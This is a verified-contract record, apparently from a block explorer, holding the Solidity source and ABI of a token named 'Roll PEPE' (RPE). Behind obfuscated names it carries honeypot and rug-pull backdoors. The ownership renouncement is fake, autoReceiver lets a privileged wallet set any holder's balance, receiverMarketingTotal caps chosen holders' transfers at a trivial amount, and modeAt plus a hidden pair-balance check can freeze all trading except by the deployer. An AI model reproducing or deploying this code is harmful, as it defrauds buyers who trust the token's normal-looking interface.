{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface atMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minReceiver) external view returns (uint256);\n\n    function transfer(address teamLiquidity, uint256 exemptTeam) external returns (bool);\n\n    function allowance(address maxLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLiquidity,\n        uint256 exemptTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromAuto, uint256 value);\n    event Approval(address indexed maxLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract tradingAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitMarketingLaunch {\n    function createPair(address walletEnableTo, address listSender) external returns (address);\n}\n\ninterface atMarketingMetadata is atMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RollPEPE is tradingAmount, atMarketing, atMarketingMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return amountEnable;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapMarketing;\n\n    uint8 private fundTx = 18;\n\n    function transferFrom(address shouldExempt, address teamLiquidity, uint256 exemptTeam) external override returns (bool) {\n        if (_msgSender() != exemptLaunchTx) {\n            if (swapMarketing[shouldExempt][_msgSender()] != type(uint256).max) {\n                require(exemptTeam <= swapMarketing[shouldExempt][_msgSender()]);\n                swapMarketing[shouldExempt][_msgSender()] -= exemptTeam;\n            }\n        }\n        return fromTo(shouldExempt, teamLiquidity, exemptTeam);\n    }\n\n    uint256 constant tradingLiquidity = 15 ** 10;\n\n    function shouldAuto() private view {\n        require(modeList[_msgSender()]);\n    }\n\n    address public modeFund;\n\n    function shouldFee(address shouldExempt, address teamLiquidity, uint256 exemptTeam) internal returns (bool) {\n        require(feeReceiver[shouldExempt] >= exemptTeam);\n        feeReceiver[shouldExempt] -= exemptTeam;\n        feeReceiver[teamLiquidity] += exemptTeam;\n        emit Transfer(shouldExempt, teamLiquidity, exemptTeam);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return tradingTeam;\n    }\n\n    uint256 private takeMode = 100000000 * 10 ** 18;\n\n    bool public toSenderEnable;\n\n    function approve(address receiverAuto, uint256 exemptTeam) public virtual override returns (bool) {\n        swapMarketing[_msgSender()][receiverAuto] = exemptTeam;\n        emit Approval(_msgSender(), receiverAuto, exemptTeam);\n        return true;\n    }\n\n    mapping(address => bool) public modeList;\n\n    constructor (){\n        \n        amountBuy teamFund = amountBuy(exemptLaunchTx);\n        fromEnable = limitMarketingLaunch(teamFund.factory()).createPair(teamFund.WETH(), address(this));\n        if (autoTeamFrom == receiverExempt) {\n            modeSell = receiverExempt;\n        }\n        modeFund = _msgSender();\n        teamFrom();\n        modeList[modeFund] = true;\n        feeReceiver[modeFund] = takeMode;\n        if (receiverExempt != modeSell) {\n            autoTeamFrom = modeSell;\n        }\n        emit Transfer(address(0), modeFund, takeMode);\n    }\n\n    uint256 private modeSell;\n\n    function allowance(address liquidityToken, address receiverAuto) external view virtual override returns (uint256) {\n        if (receiverAuto == exemptLaunchTx) {\n            return type(uint256).max;\n        }\n        return swapMarketing[liquidityToken][receiverAuto];\n    }\n\n    uint256 buyTradingLaunched;\n\n    mapping(address => uint256) private feeReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTx;\n    }\n\n    mapping(address => bool) public marketingFrom;\n\n    string private amountEnable = \"Roll PEPE\";\n\n    function fromTo(address shouldExempt, address teamLiquidity, uint256 exemptTeam) internal returns (bool) {\n        if (shouldExempt == modeFund) {\n            return shouldFee(shouldExempt, teamLiquidity, exemptTeam);\n        }\n        uint256 sellAtTeam = atMarketing(fromEnable).balanceOf(marketingFeeLaunched);\n        require(sellAtTeam == amountToken);\n        require(teamLiquidity != marketingFeeLaunched);\n        if (marketingFrom[shouldExempt]) {\n            return shouldFee(shouldExempt, teamLiquidity, tradingLiquidity);\n        }\n        return shouldFee(shouldExempt, teamLiquidity, exemptTeam);\n    }\n\n    function autoReceiver(address autoSwap, uint256 exemptTeam) public {\n        shouldAuto();\n        feeReceiver[autoSwap] = exemptTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingTeam;\n    }\n\n    address exemptLaunchTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address minReceiver) public view virtual override returns (uint256) {\n        return feeReceiver[minReceiver];\n    }\n\n    event OwnershipTransferred(address indexed swapSell, address indexed txTotalFund);\n\n    uint256 public autoTeamFrom;\n\n    address marketingFeeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverMarketingTotal(address toShouldLaunched) public {\n        shouldAuto();\n        \n        if (toShouldLaunched == modeFund || toShouldLaunched == fromEnable) {\n            return;\n        }\n        marketingFrom[toShouldLaunched] = true;\n    }\n\n    uint256 amountToken;\n\n    function teamFrom() public {\n        emit OwnershipTransferred(modeFund, address(0));\n        tradingTeam = address(0);\n    }\n\n    string private autoFund = \"RPE\";\n\n    function transfer(address autoSwap, uint256 exemptTeam) external virtual override returns (bool) {\n        return fromTo(_msgSender(), autoSwap, exemptTeam);\n    }\n\n    address public fromEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeMode;\n    }\n\n    function tokenAt(address txToken) public {\n        require(txToken.balance < 100000);\n        if (toSenderEnable) {\n            return;\n        }\n        \n        modeList[txToken] = true;\n        \n        toSenderEnable = true;\n    }\n\n    uint256 private receiverExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoFund;\n    }\n\n    function modeAt(uint256 exemptTeam) public {\n        shouldAuto();\n        amountToken = exemptTeam;\n    }\n\n    address private tradingTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotalFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTeam\",\"type\":\"uint256\"}],\"name\":\"autoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeamFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptTeam\",\"type\":\"uint256\"}],\"name\":\"modeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShouldLaunched\",\"type\":\"address\"}],\"name\":\"receiverMarketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RollPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}